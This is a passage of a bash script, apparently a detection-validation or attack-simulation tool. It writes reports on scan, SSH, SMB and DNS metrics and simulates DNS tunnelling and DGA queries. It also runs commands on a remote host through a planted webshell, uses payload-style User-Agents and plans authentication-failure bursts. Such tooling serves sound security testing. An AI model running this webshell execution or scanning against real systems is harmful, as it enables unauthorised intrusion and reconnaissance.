| Planned Requests | ${HTTP_FOLLOWUP_PLANNED_REQUESTS:-${HTTP_REQUESTS_PLANNED:-0}} |
| Actual Requests | ${HTTP_REQUESTS_ATTEMPTED:-0} |
| Responses | ${WEB_RESPONSES_RECEIVED:-0} |
| Success Rate | $(( HTTP_REQUESTS_ATTEMPTED > 0 ? WEB_RESPONSES_RECEIVED * 100 / HTTP_REQUESTS_ATTEMPTED : 0 ))% |
| HTTP Planned | ${HTTP_REQUESTS_PLANNED} |
| HTTP Attempted | ${HTTP_REQUESTS_ATTEMPTED} |
| HTTP Connected | ${HTTP_CONNECTED} |
| HTTP Responses Received | ${HTTP_RESPONSES_RECEIVED} |
| HTTP 403 Count | ${HTTP_403_COUNT} |
| HTTP 404 Count | ${HTTP_404_COUNT} |
| HTTP 405 Count | ${HTTP_405_COUNT} |
| HTTP Failed Responses | ${HTTP_SCAN_FAILED_RESPONSES} |
| HTTP Successful Responses | ${HTTP_SCAN_SUCCESS_RESPONSES} |
| HTTP Fail Ratio | ${HTTP_SCAN_FAIL_RATIO}% |
| PROPFIND Count | ${HTTP_PROPFIND_COUNT} |
| POST Count | ${HTTP_POST_COUNT} |
| OPTIONS Count | ${HTTP_OPTIONS_COUNT} |
| Scan Targets (responsive) | ${HTTP_SCAN_TARGET_COUNT} |
| Unique URLs Attempted | ${URL_SCAN_UNIQUE_ATTEMPTED} |
| Unique Failed URLs | ${URL_SCAN_UNIQUE_FAILED} |
| Unique Successful URLs | ${URL_SCAN_UNIQUE_SUCCESS} |
| Unique Failure Ratio | ${URL_SCAN_UNIQUE_FAIL_RATIO}% |
| Estimated Anomaly Score | ${URL_SCAN_ANOMALY_SCORE} |
| Expected Detection | External URL Reconnaissance Anomaly |
| Expected Event | external_url_scan |
| Expected Technique | T1595 Active Scanning |
| Threat Hunt URL Requests | ${THREAT_HUNT_URL_REQUESTS} |
| Abnormal User-Agent Count | ${ABNORMAL_USER_AGENT_COUNT} |
| Rare User-Agent Count | ${RARE_USER_AGENT_COUNT} |
| Normal User-Agent Count | ${NORMAL_USER_AGENT_COUNT} |
| Payload User-Agent Count | ${PAYLOAD_USER_AGENT_COUNT} |
| SQLi-style UA Count | ${UA_SQLI_STYLE_COUNT} |
| Encoding-abuse UA Count | ${UA_ENCODING_ABUSE_COUNT} |
| Command-style UA Count | ${UA_COMMAND_STYLE_COUNT} |
| HTTP Follow-up Mode | ${HTTP_FOLLOWUP_MODE} |
| Expected HTTP Detection Impact | ${EXPECTED_HTTP_DETECTION_IMPACT} |

## IDS/WAF/EDR Signature Probe

| Metric | Value |
|---|---|
| Status | ${IDS_WAF_SIG_PROBE_STATUS} |
| Active web targets | ${IDS_WAF_SIG_TARGET_COUNT} |
| Signatures attempted | ${IDS_WAF_SIG_ATTEMPTED} |
| HTTP responses | ${IDS_WAF_SIG_RESPONSES} |
| Traversal signatures | ${IDS_WAF_SIG_TRAVERSAL} |
| Tomcat PUT signature | ${IDS_WAF_SIG_TOMCAT_PUT} |
| Spring header signature | ${IDS_WAF_SIG_SPRING_HDR} |
| EDR cmd.jsp signatures | ${IDS_WAF_SIG_EDR_CMD} |

## EDR Static Signature Detection Test

| Metric | Value |
|---|---|
| Stage status | ${EDR_STATIC_STAGE_STATUS} |
| Files attempted | ${EDR_TEST_FILES_ATTEMPTED} |
| Files created | ${EDR_TEST_FILES_SUCCESS} |
| Quarantine suspected | ${EDR_TEST_QUARANTINE_SUSPECTED} |
| Create failed | ${EDR_TEST_FILES_FAILED} |
| Remote OS | ${EDR_TEST_REMOTE_OS} |
| Test directory | ${EDR_TEST_DIR:-n/a} |
| Webshell URL | ${WEB_SHELL_URL:-n/a} |
| Extended files | ${EDR_EXTENDED_FILES} |
| Cleanup on PoC exit | ${EDR_TEST_CLEANUP} |

## Service Follow-up Telemetry

| Metric | Value |
|---|---|
| User Intensity | ${POC_INTENSITY} |
| Duration (minutes) | ${DURATION_MINUTES} |
| Persistent Beacon Enabled | ${PERSISTENT_BEACON} |
| Overlap Enabled | ${PIPELINE_OVERLAP} |
| Services Discovered (host entries) | ${SERVICES_DISCOVERED_TOTAL} |
| Follow-up Actions Total | ${FOLLOWUP_ACTIONS_TOTAL} |
| HTTP Planned / Attempted / Connected | ${HTTP_REQUESTS_PLANNED} / ${HTTP_REQUESTS_ATTEMPTED} / ${HTTP_CONNECTED} |
| HTTP Responses / Threat Hunt / Abnormal / Rare UA | ${HTTP_RESPONSES_RECEIVED} / ${THREAT_HUNT_URL_REQUESTS} / ${ABNORMAL_USER_AGENT_COUNT} / ${RARE_USER_AGENT_COUNT} |
| HTTP Requests (counter) | ${FOLLOWUP_HTTP_REQUESTS} |
| SSH Planned / Attempted / Observed | ${SSH_ATTEMPTS_PLANNED} / ${SSH_AUTH_ATTEMPTED} / ${SSH_AUTH_FAILURES_OBSERVED} |
| SSH Attempts Executed | ${SSH_ATTEMPTS_EXECUTED} |
| SSH Auth Failures (counter) | ${FOLLOWUP_SSH_AUTH_FAILURES} |
| SMB Planned / Attempted / Connected | ${SMB_PROBES_PLANNED} / ${SMB_PROBES_ATTEMPTED} / ${SMB_PROBES_CONNECTED} |
| SMB Probe Count | ${FOLLOWUP_SMB_PROBES} |
| DNS Planned / Attempted | ${DNS_BURST_COUNT} / ${DNS_QUERIES_ATTEMPTED} |
| DNS Query Count | ${FOLLOWUP_DNS_QUERIES} |
| Services Usable (validated) | ${SERVICES_USABLE_TOTAL} |
| Degraded Telemetry | ${DEGRADED_TELEMETRY} |
| Service Spike | ${SERVICE_SPIKE} (${SERVICE_SPIKE_SECONDS}s) |
| Scan-only / Validation | ${scan_warn} |
| Follow-up Validation Failed | ${FOLLOWUP_VALIDATION_FAILED} |

### ML / XDR Spike Indicators
- High-volume HTTP URI probing (${FOLLOWUP_HTTP_REQUESTS} requests)
- Repeated SSH auth failures (${FOLLOWUP_SSH_AUTH_FAILURES})
- SMB enumeration bursts (${FOLLOWUP_SMB_PROBES})
- DNS entropy queries (${FOLLOWUP_DNS_QUERIES})
- Overlap + persistent beacon: ${PIPELINE_OVERLAP} / ${PERSISTENT_BEACON}

### Detection Opportunity Summary
- WAF/IDS: suspicious URI storm, odd User-Agents, 404 patterns
- SIEM: failed SSH authentication chains
- NDR: SMB/RPC lateral recon, DNS tunneling entropy
- UEBA: burst timing + concurrent overlap stages
- XDR ML: volume spike vs baseline during campaign window

### Detection Threshold Notes
- Target: exceed baseline for ML/anomaly engines during campaign window
- HTTP: ${FOLLOWUP_HTTP_REQUESTS} requests (planned ${HTTP_REQUESTS_PLANNED})
- SSH: ${FOLLOWUP_SSH_AUTH_FAILURES} auth-failure events (planned ${SSH_ATTEMPTS_PLANNED})
- Strict validation: ${STRICT_FOLLOWUP_VALIDATION}

### Suggested Validation Commands
**SSH (auth.log / journal — not visible in encrypted SSH payload alone):**
\`\`\`bash
sudo journalctl -u ssh -f
sudo tail -f /var/log/auth.log
\`\`\`
**HTTP (web access logs):**
\`\`\`bash
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/apache2/access.log
\`\`\`

### Discovered Service Files
$(read_state_file_or_none "discovered_service_files.log" | sed 's/^/- /')

EOF
        write_dns_tunnel_report
        write_dns_new_tld_report
        write_edr_static_test_report
    fi
}

# ==============================================================================
# Correlation telemetry: External Callback, Internal Web Fanout, DNS
# ==============================================================================


save_dns_tunnel_overlap_result() {
    write_overlap_stage_result_env "dns_tunnel_result.env" \
        "DNS_TUNNEL_STAGE_STATUS" "${DNS_TUNNEL_STAGE_STATUS:-skipped}" \
        "DNS_QUERIES_PLANNED" "${DNS_QUERIES_PLANNED:-0}" \
        "DNS_QUERIES_ATTEMPTED" "${DNS_QUERIES_ATTEMPTED:-0}" \
        "DNS_TUNNEL_UNIQUE_QUERIES" "${DNS_TUNNEL_UNIQUE_QUERIES:-0}" \
        "DNS_TUNNEL_NXDOMAIN_COUNT" "${DNS_TUNNEL_NXDOMAIN_COUNT:-0}" \
        "DNS_TUNNEL_RESOLVED_COUNT" "${DNS_TUNNEL_RESOLVED_COUNT:-0}" \
        "DNS_TUNNEL_TIMEOUT_COUNT" "${DNS_TUNNEL_TIMEOUT_COUNT:-0}" \
        "DNS_TUNNEL_ERROR_COUNT" "${DNS_TUNNEL_ERROR_COUNT:-0}" \
        "DNS_TUNNEL_ENH_ATTEMPTED" "${DNS_TUNNEL_ENH_ATTEMPTED:-0}" \
        "DNS_TUNNEL_FB_ATTEMPTED" "${DNS_TUNNEL_FB_ATTEMPTED:-0}" \
        "DNS_RESPONSES_RECEIVED" "${DNS_RESPONSES_RECEIVED:-0}" \
        "DNS_EFFECTIVE_TLD_COUNT" "${DNS_EFFECTIVE_TLD_COUNT:-0}" \
        "DNS_CLUSTER_LOCAL_COUNT" "${DNS_CLUSTER_LOCAL_COUNT:-0}" \
        "DNS_POWERAPPS_STYLE_COUNT" "${DNS_POWERAPPS_STYLE_COUNT:-0}" \
        "DNS_SUSPICIOUS_TLD_COUNT" "${DNS_SUSPICIOUS_TLD_COUNT:-0}" \
        "DNS_HTTPS_QUERY_COUNT" "${DNS_HTTPS_QUERY_COUNT:-0}" \
        "DNS_TOTAL_ENTROPY_STYLE_COUNT" "${DNS_TOTAL_ENTROPY_STYLE_COUNT:-0}" \
        "DEGRADED_TELEMETRY" "${DEGRADED_TELEMETRY:-false}"
}

save_dga_simulation_overlap_result() {
    write_overlap_stage_result_env "dga_simulation_result.env" \
        "DGA_STAGE_STATUS" "${DGA_STAGE_STATUS:-skipped}" \
        "DGA_TOTAL_QUERIES" "${DGA_TOTAL_QUERIES:-0}" \
        "DGA_NXDOMAIN_COUNT" "${DGA_NXDOMAIN_COUNT:-0}" \
        "DGA_RESOLVED_COUNT" "${DGA_RESOLVED_COUNT:-0}" \
        "DGA_TIMEOUT_COUNT" "${DGA_TIMEOUT_COUNT:-0}" \
        "DGA_ERROR_COUNT" "${DGA_ERROR_COUNT:-0}" \
        "DGA_DETECTION_LIKELIHOOD" "${DGA_DETECTION_LIKELIHOOD:-LOW}" \
        "DGA_DETECTION_REASON" "${DGA_DETECTION_REASON:-}" \
        "DGA_FINAL_RESULT" "${DGA_FINAL_RESULT:-skipped}" \
        "DGA_DNS_SERVER" "${DGA_DNS_SERVER:-}" \
        "DGA_QUERIES_ATTEMPTED" "${DGA_QUERIES_ATTEMPTED:-0}" \
        "DGA_QUERIES_SENT" "${DGA_QUERIES_SENT:-0}" \
        "DEGRADED_TELEMETRY" "${DEGRADED_TELEMETRY:-false}"
}

save_internal_fanout_overlap_result() {
    write_overlap_stage_result_env "internal_fanout_result.env" \
        "INTERNAL_FANOUT_STATUS" "${INTERNAL_FANOUT_STATUS:-skipped}" \
        "INTERNAL_FANOUT_TARGETS" "${INTERNAL_FANOUT_TARGETS:-0}" \
        "INTERNAL_FANOUT_ATTEMPTED" "${INTERNAL_FANOUT_ATTEMPTED:-0}" \
        "INTERNAL_FANOUT_CONNECTED" "${INTERNAL_FANOUT_CONNECTED:-0}" \
        "INTERNAL_FANOUT_RESPONSES" "${INTERNAL_FANOUT_RESPONSES:-0}" \
        "FANOUT_UA_JNDI_STYLE_COUNT" "${FANOUT_UA_JNDI_STYLE_COUNT:-0}" \
        "FANOUT_UA_OGNL_STYLE_COUNT" "${FANOUT_UA_OGNL_STYLE_COUNT:-0}" \
        "FANOUT_UA_SPRING_STYLE_COUNT" "${FANOUT_UA_SPRING_STYLE_COUNT:-0}"
}

save_external_callback_overlap_result() {
    write_overlap_stage_result_env "external_callback_result.env" \
        "EXTERNAL_CALLBACK_STATUS" "${EXTERNAL_CALLBACK_STATUS:-skipped}" \
        "EXTERNAL_CALLBACK_ATTEMPTED" "${EXTERNAL_CALLBACK_ATTEMPTED:-0}" \
        "EXTERNAL_CALLBACK_CONNECTED" "${EXTERNAL_CALLBACK_CONNECTED:-0}" \
        "EXTERNAL_CALLBACK_RESPONSES" "${EXTERNAL_CALLBACK_RESPONSES:-0}" \
        "CORRELATION_BEACON_CYCLES" "${CORRELATION_BEACON_CYCLES:-0}"
}

save_http_url_scan_overlap_result() {
    sync_web_combined_metrics
    compute_web_detection_confidence
    write_overlap_stage_result_env "http_url_scan_result.env" \
        "HTTP_URL_SCAN_STAGE_STATUS" "${HTTP_URL_SCAN_STAGE_STATUS:-skipped}" \
        "HTTP_SCAN_TARGET_COUNT" "${HTTP_SCAN_TARGET_COUNT:-0}" \
        "HTTP_REQUESTS_PLANNED" "${HTTP_REQUESTS_PLANNED:-0}" \
        "HTTP_REQUESTS_ATTEMPTED" "${HTTP_REQUESTS_ATTEMPTED:-0}" \
        "HTTP_CONNECTED" "${HTTP_CONNECTED:-0}" \
        "HTTP_RESPONSES_RECEIVED" "${HTTP_RESPONSES_RECEIVED:-0}" \
        "HTTPS_REQUESTS_ATTEMPTED" "${HTTPS_REQUESTS_ATTEMPTED:-0}" \
        "HTTPS_CONNECTED" "${HTTPS_CONNECTED:-0}" \
        "HTTPS_RESPONSES_RECEIVED" "${HTTPS_RESPONSES_RECEIVED:-0}" \
        "WEB_RESPONSES_RECEIVED" "${WEB_RESPONSES_RECEIVED:-0}" \
        "HTTP_SCAN_FAILED_RESPONSES" "${HTTP_SCAN_FAILED_RESPONSES:-0}" \
        "HTTP_SCAN_SUCCESS_RESPONSES" "${HTTP_SCAN_SUCCESS_RESPONSES:-0}" \
        "HTTPS_SCAN_FAILED_RESPONSES" "${HTTPS_SCAN_FAILED_RESPONSES:-0}" \
        "HTTPS_SCAN_SUCCESS_RESPONSES" "${HTTPS_SCAN_SUCCESS_RESPONSES:-0}" \
        "WEB_FAILED_RESPONSES" "${WEB_FAILED_RESPONSES:-0}" \
        "WEB_SUCCESS_RESPONSES" "${WEB_SUCCESS_RESPONSES:-0}" \
        "HTTP_200_COUNT" "${HTTP_200_COUNT:-0}" \
        "HTTP_301_COUNT" "${HTTP_301_COUNT:-0}" \
        "HTTP_302_COUNT" "${HTTP_302_COUNT:-0}" \
        "HTTP_401_COUNT" "${HTTP_401_COUNT:-0}" \
        "HTTP_403_COUNT" "${HTTP_403_COUNT:-0}" \
        "HTTP_404_COUNT" "${HTTP_404_COUNT:-0}" \
        "HTTP_405_COUNT" "${HTTP_405_COUNT:-0}" \
        "HTTPS_200_COUNT" "${HTTPS_200_COUNT:-0}" \
        "HTTPS_301_COUNT" "${HTTPS_301_COUNT:-0}" \
        "HTTPS_302_COUNT" "${HTTPS_302_COUNT:-0}" \
        "HTTPS_401_COUNT" "${HTTPS_401_COUNT:-0}" \
        "HTTPS_403_COUNT" "${HTTPS_403_COUNT:-0}" \
        "HTTPS_404_COUNT" "${HTTPS_404_COUNT:-0}" \
        "HTTPS_405_COUNT" "${HTTPS_405_COUNT:-0}" \
        "HTTP_PROPFIND_COUNT" "${HTTP_PROPFIND_COUNT:-0}" \
        "HTTP_OPTIONS_COUNT" "${HTTP_OPTIONS_COUNT:-0}" \
        "HTTP_POST_COUNT" "${HTTP_POST_COUNT:-0}" \
        "ABNORMAL_USER_AGENT_COUNT" "${ABNORMAL_USER_AGENT_COUNT:-0}" \
        "RARE_USER_AGENT_COUNT" "${RARE_USER_AGENT_COUNT:-0}" \
        "NORMAL_USER_AGENT_COUNT" "${NORMAL_USER_AGENT_COUNT:-0}" \
        "PAYLOAD_USER_AGENT_COUNT" "${PAYLOAD_USER_AGENT_COUNT:-0}" \
        "UA_SQLI_STYLE_COUNT" "${UA_SQLI_STYLE_COUNT:-0}" \
        "UA_ENCODING_ABUSE_COUNT" "${UA_ENCODING_ABUSE_COUNT:-0}" \
        "UA_COMMAND_STYLE_COUNT" "${UA_COMMAND_STYLE_COUNT:-0}" \
        "UA_TRAVERSAL_STYLE_COUNT" "${UA_TRAVERSAL_STYLE_COUNT:-0}" \
        "UA_JNDI_STYLE_COUNT" "${UA_JNDI_STYLE_COUNT:-0}" \
        "UA_OGNL_STYLE_COUNT" "${UA_OGNL_STYLE_COUNT:-0}" \
        "UA_SPRING_STYLE_COUNT" "${UA_SPRING_STYLE_COUNT:-0}" \
        "URL_SCAN_DEGRADED_FALLBACK" "${URL_SCAN_DEGRADED_FALLBACK:-false}" \
        "WEB_DETECTION_CONFIDENCE" "${WEB_DETECTION_CONFIDENCE:-Low}" \
        "WEB_FAIL_RATIO" "${WEB_FAIL_RATIO:-0}" \
        "HTTP_SCAN_FAIL_RATIO" "${HTTP_SCAN_FAIL_RATIO:-0}" \
        "URL_SCAN_UNIQUE_ATTEMPTED" "${URL_SCAN_UNIQUE_ATTEMPTED:-0}" \
        "URL_SCAN_UNIQUE_FAILED" "${URL_SCAN_UNIQUE_FAILED:-0}" \
        "URL_SCAN_UNIQUE_SUCCESS" "${URL_SCAN_UNIQUE_SUCCESS:-0}" \
        "URL_SCAN_UNIQUE_FAIL_RATIO" "${URL_SCAN_UNIQUE_FAIL_RATIO:-0}" \
        "URL_SCAN_ANOMALY_SCORE" "${URL_SCAN_ANOMALY_SCORE:-0}" \
        "HTTP_SCAN_UNIQUE_URL_TARGET" "${HTTP_SCAN_UNIQUE_URL_TARGET:-50}" \
        "FOLLOWUP_HTTP_REQUESTS" "${FOLLOWUP_HTTP_REQUESTS:-0}" \
        "HTTP_ATTACK_TOTAL_REQUESTS" "${HTTP_ATTACK_TOTAL_REQUESTS:-0}" \
        "HTTP_ATTACK_PAYLOAD_URL_REQUESTS" "${HTTP_ATTACK_PAYLOAD_URL_REQUESTS:-0}" \
        "HTTP_ATTACK_PAYLOAD_UA_REQUESTS" "${HTTP_ATTACK_PAYLOAD_UA_REQUESTS:-0}" \
        "HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA" "${HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA:-0}" \
        "HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA" "${HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA:-0}" \
        "HTTP_UA_COVERAGE_TOTAL" "${HTTP_UA_COVERAGE_TOTAL:-0}" \
        "HTTP_UA_COVERAGE_PRESENT" "${HTTP_UA_COVERAGE_PRESENT:-0}" \
        "HTTP_UA_COVERAGE_MISSING" "${HTTP_UA_COVERAGE_MISSING:-0}" \
        "HTTP_UA_COVERAGE_PERCENT" "${HTTP_UA_COVERAGE_PERCENT:-0}" \
        "HTTP_UA_COVERAGE_NORMAL" "${HTTP_UA_COVERAGE_NORMAL:-0}" \
        "HTTP_UA_COVERAGE_RARE" "${HTTP_UA_COVERAGE_RARE:-0}" \
        "HTTP_UA_COVERAGE_PAYLOAD" "${HTTP_UA_COVERAGE_PAYLOAD:-0}" \
        "HTTP_UA_COVERAGE_ABNORMAL" "${HTTP_UA_COVERAGE_ABNORMAL:-0}" \
        "DETECTION_LIKELIHOOD_URL_SCAN" "${DETECTION_LIKELIHOOD_URL_SCAN:-low}" \
        "DETECTION_LIKELIHOOD_MALICIOUS_UA" "${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}" \
        "DEGRADED_TELEMETRY" "${DEGRADED_TELEMETRY:-false}"
}

save_nonstandard_port_overlap_result() {
    write_overlap_stage_result_env "nonstandard_port_result.env" \
        "NONSTANDARD_PORT_CONNECTIONS" "${NONSTANDARD_PORT_CONNECTIONS:-0}"
}

probe_remote_ping_capability() {
    local probe_out ttl_test
    PING_FLAVOR="unknown"
    PING_TTL_OPT="-t"
    PING_TIMEOUT_OPT="-W"
    PING_TTL_SUPPORTED=true
    [[ "${HAS_ping:-false}" != true ]] && return 0
    REMOTE_PING_PATH=$(run_webshell_raw "ping-path" "command -v ping 2>/dev/null || true")
    REMOTE_PING_PATH=$(strip_stdout_capture_noise "${REMOTE_PING_PATH}")
    REMOTE_PING_PATH="${REMOTE_PING_PATH//$'\r'/}"
    REMOTE_PING_PATH=$(printf '%s\n' "${REMOTE_PING_PATH}" | awk 'NF && $0 !~ /^\[/ {print; exit}')
    [[ -z "${REMOTE_PING_PATH}" ]] && REMOTE_PING_PATH="ping"
    probe_out=$(run_webshell_raw "ping-flavor-probe" \
        "${REMOTE_SHELL_HELPERS} ping --version 2>&1 | head -n1; ping -h 2>&1 | head -n3" 2>/dev/null || true)
    probe_out=$(strip_stdout_capture_noise "${probe_out}")
    case "${probe_out}" in
        *[Ii]putils*|*iputils*) PING_FLAVOR="iputils" ;;
        *[Bb]usy[Bb]ox*) PING_FLAVOR="busybox" ;;
        *) PING_FLAVOR="unknown" ;;
    esac
    ttl_test=$(run_webshell_raw "ping-ttl-probe" \
        "${REMOTE_SHELL_HELPERS} ping -c 1 -t 1 -W 1 127.0.0.1 >/dev/null 2>&1 && echo TTL_OK || echo TTL_FAIL" 2>/dev/null || true)
    ttl_test=$(strip_stdout_capture_noise "${ttl_test}")
    if [[ "${ttl_test}" != *"TTL_OK"* ]]; then
        PING_TTL_SUPPORTED=false
        PING_TTL_OPT=""
        case "${PING_FLAVOR}" in
            busybox) PING_TIMEOUT_OPT="-w" ;;
        esac
    fi
    [[ -n "${REMOTE_PING_PATH}" ]] && add_dependency_status "ping-path: ${REMOTE_PING_PATH} flavor=${PING_FLAVOR} ttl_opt=${PING_TTL_OPT:-none} timeout_opt=${PING_TIMEOUT_OPT}"
}

collect_hosts_from_remote_file() {
    local f="$1" cache merged=""
    cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
    if [[ -s "${cache}" ]]; then
        merged=$(extract_host_file_lines < "${cache}")
    else
        merged=$(get_local_hosts "${f}" 2>/dev/null || true)
    fi
    printf '%s\n' "${merged}"
}

collect_dns_tunnel_targets() {
    local merged=""
    merged=$(collect_hosts_from_remote_file "usable_dns_hosts.txt")
    if [[ -z "${merged}" ]]; then
        merged=$(collect_hosts_from_remote_file "dns_hosts.txt")
    fi
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ {print $1}' | sort -u
}


collect_internal_fanout_targets() {
    local http https merged="" line norm host port scheme
    declare -A seen=()
    merged=""
    for scheme in http https; do
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
            [[ -n "${seen[${host}:${port}]:-}" ]] && continue
            seen[${host}:${port}]=1
            merged=$(printf '%s\n%s' "${merged}" "${host}:${port}")
        done < <(collect_hosts_from_remote_file "reachable_${scheme}_targets.txt")
    done
    if [[ -z "${merged}" ]]; then
        for scheme in http https; do
            while IFS= read -r line; do
                [[ -z "${line}" ]] && continue
                read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
                [[ -n "${seen[${host}:${port}]:-}" ]] && continue
                seen[${host}:${port}]=1
                merged=$(printf '%s\n%s' "${merged}" "${host}:${port}")
            done < <(collect_web_target_candidates "${scheme}")
        done
    fi
    printf '%s\n' "${merged}" | awk 'NF'
}

collect_nonstandard_port_hosts() {
    local merged="" f
    for f in alive_hosts.txt usable_http_targets.txt usable_https_targets.txt \
            usable_ssh_hosts.txt usable_dns_hosts.txt http_targets.txt https_targets.txt \
            ssh_hosts.txt dns_hosts.txt; do
        merged=$(printf '%s\n%s' "${merged}" "$(collect_hosts_from_remote_file "${f}")")
    done
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ {print $1}' | sort -u | head -n 24
}

append_dns_tunnel_wave_log() {
    local msg="$1"
    mkdir -p "${LOG_DIR}"
    printf '%s\n' "[$(date '+%Y-%m-%d %H:%M:%S')] cycle=${CURRENT_CYCLE:-1} ${msg}" >> "${LOG_DIR}/dns_tunnel_waves.log"
}

dns_tunnel_log_both() {
    local msg="$1"
    append_dns_tunnel_wave_log "${msg}"
    state_append "dns_tunnel_simulation.log" "cycle=${CURRENT_CYCLE:-1} ${msg}"
    log_message "OK" "DNS Tunnel: ${msg}" >&2
}

dns_posix_inline_helpers() {
    cat <<'DNS_POSIX_HELPERS'
rand_bytes(){ n="${1:-8}"; if [ -r /dev/urandom ]; then head -c "$n" /dev/urandom 2>/dev/null; elif command -v openssl >/dev/null 2>&1; then openssl rand -hex "$n" 2>/dev/null; else printf '%s%s' "$$" "$(date +%s 2>/dev/null || echo 0)"; fi; }
randlbl(){ n="${1:-6}"; s=$(rand_bytes 4 2>/dev/null | tr -dc 'a-z0-9' | head -c "$n" 2>/dev/null); [ -n "$s" ] || s="poc$$"; printf '%s' "$s"; }
randlbl32(){ n="${1:-32}"; s=$(rand_bytes 10 2>/dev/null | tr -dc 'A-Z2-7' | head -c "$n" 2>/dev/null); [ -n "$s" ] || s=$(randlbl "$n"); printf '%s' "$s"; }
randb64url(){ n="${1:-32}"; s=$(rand_bytes 16 2>/dev/null | tr '+/=' '-_' | tr -dc 'A-Za-z0-9_-' | head -c "$n" 2>/dev/null); [ -n "$s" ] || s=$(randlbl32 "$n"); printf '%s' "$s"; }
randhex(){ n="${1:-48}"; s=$(rand_bytes 32 2>/dev/null | tr -dc 'a-f0-9' | head -c "$n" 2>/dev/null); [ -n "$s" ] || s=$(randb64url "$n"); printf '%s' "$s"; }
label_ent_score(){ lbl="$1"; len=${#lbl}; [ "$len" -lt 1 ] && { printf '0'; return; }; u=$(printf '%s' "$lbl" | sed 's/./&\n/g' | sort -u | grep -c . 2>/dev/null || echo 1); sc=$(( u * 100 / (len > 32 ? 32 : len) )); [ "$len" -ge 24 ] && sc=$((sc + 15)); [ "$len" -ge 40 ] && sc=$((sc + 10)); printf '%s' "$sc"; }
longest_label_len(){ fq="$1"; best=0; rest="$fq"; while [ -n "$rest" ]; do p="${rest%%.*}"; [ "$p" = "$rest" ] && rest="" || rest="${rest#*.}"; l=${#p}; [ "$l" -gt "$best" ] && best="$l"; done; printf '%s' "$best"; }
rand_domain(){ printf '%s.invalid' "$(randlbl 10)"; }
DNS_POSIX_HELPERS
}

dns_remote_script_open() {
    local delim="${1:-DNS_POC_REMOTE}"
    printf '%s\n' "if command -v bash >/dev/null 2>&1; then bash <<'${delim}'"
    dns_posix_inline_helpers
}

dns_remote_script_close() {
    local delim="${1:-DNS_POC_REMOTE}"
    printf '%s\n' "${delim}"
    printf '%s\n' "else"
    dns_posix_inline_helpers
    printf '%s\n' "fi"
}

dns_extract_remote_bash_body() {
    local payload="$1" delim="$2" body=""
    [[ -z "${payload}" || -z "${delim}" ]] && return 1
    body=$(printf '%s\n' "${payload}" | awk -v d="${delim}" '
        $0 ~ "bash <<'\''" d "'\''" { capture=1; next }
        capture && $0 == d { exit }
        capture { print }
    ')
    [[ -n "${body}" ]]
    printf '%s' "${body}"
}

dns_validate_remote_payload_syntax_local() {
    local payload="$1" delim="${2:-DNS_TUNNEL_SIM_SCRIPT}"
    local body="" tmp=""
    body=$(dns_extract_remote_bash_body "${payload}" "${delim}" 2>/dev/null || true)
    [[ -z "${body}" ]] && return 1
    tmp=$(mktemp)
    {
        dns_posix_inline_helpers
        printf '%s\n' "${body}"
    } > "${tmp}"
    bash -n "${tmp}" 2>/dev/null
    local rc=$?
    rm -f "${tmp}"
    return "${rc}"
}

precheck_dns_remote_payload_syntax() {
    local payload="$1" delim="${2:-DNS_TUNNEL_SIM_SCRIPT}" body="" out="" check_cmd=""
    [[ "${DRY_RUN}" == true ]] && return 0
    body=$(dns_extract_remote_bash_body "${payload}" "${delim}" 2>/dev/null || true)
    [[ -z "${body}" ]] && return 1
    if ! dns_validate_remote_payload_syntax_local "${payload}" "${delim}"; then
        dns_tunnel_log_both "DNS_PAYLOAD_SYNTAX_ERROR scope=local precheck delim=${delim}"
        return 1
    fi
    check_cmd=$(cat <<EOF
if command -v bash >/dev/null 2>&1; then
bash -n <<'${delim}_PRECHECK' 2>&1
${body}
${delim}_PRECHECK
rc=\$?
[ \$rc -eq 0 ] && echo DNS_PAYLOAD_SYNTAX_OK || echo DNS_PAYLOAD_SYNTAX_ERROR rc=\$rc
else
echo DNS_PAYLOAD_SYNTAX_ERROR reason=no_bash
fi
EOF
)
    out=$(run_webshell_quick "dns-payload-syntax-precheck" "${check_cmd}" 2>/dev/null || true)
    if [[ "${out}" == *DNS_PAYLOAD_SYNTAX_OK* ]]; then
        return 0
    fi
    dns_tunnel_log_both "DNS_PAYLOAD_SYNTAX_ERROR scope=remote precheck delim=${delim} detail=$(printf '%.200s' "${out}")"
    return 1
}

log_dns_tunnel_selected_resolver() {
    local server="$1" source="$2" reason="$3"
    DNS_TUNNEL_SELECTED_RESOLVER="${server}"
    DNS_TUNNEL_RESOLVER_SOURCE="${source}"
    local msg="DNS_TUNNEL_SELECTED_RESOLVER server=${server} source=${source} reason=${reason}"
    state_append "dns_tunnel_resolver.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

log_dns_tunnel_query_exec() {
    local server="$1" query="$2" qtype="$3" result="$4"
    local msg="DNS_TUNNEL_QUERY_EXEC server=${server} query=${query} qtype=${qtype} result=${result}"
    append_dns_tunnel_wave_log "${msg}"
}

log_dns_tunnel_query_telemetry() {
    local msg="$1"
    append_dns_tunnel_wave_log "${msg}"
}

probe_dns_server_incoming_queries() {
    local server="$1" out="" count=0 token=""
    server=$(poc_extract_ipv4 "${server}")
    [[ -z "${server}" ]] && return 1
    if [[ "${DRY_RUN}" == true ]]; then
        printf '0'
        return 1
    fi
    if command -v dig >/dev/null 2>&1; then
        out=$(dig +time=2 +tries=1 @"${server}" localhost bind9/statistics CH TXT 2>/dev/null || true)
        token=$(printf '%s\n' "${out}" | tr '"' '\n' | grep -E '^queries received=' | tail -n1 | sed 's/queries received=//')
        count=$(safe_int "${token}")
        if (( count > 0 )); then
            printf '%s' "${count}"
            return 0
        fi
        token=$(printf '%s\n' "${out}" | tr '"' '\n' | grep -E '^total queries=' | tail -n1 | sed 's/total queries=//')
        count=$(safe_int "${token}")
        if (( count > 0 )); then
            printf '%s' "${count}"
            return 0
        fi
    fi
    printf '0'
    return 1
}

capture_dns_server_query_baseline() {
    local server="$1" baseline=0
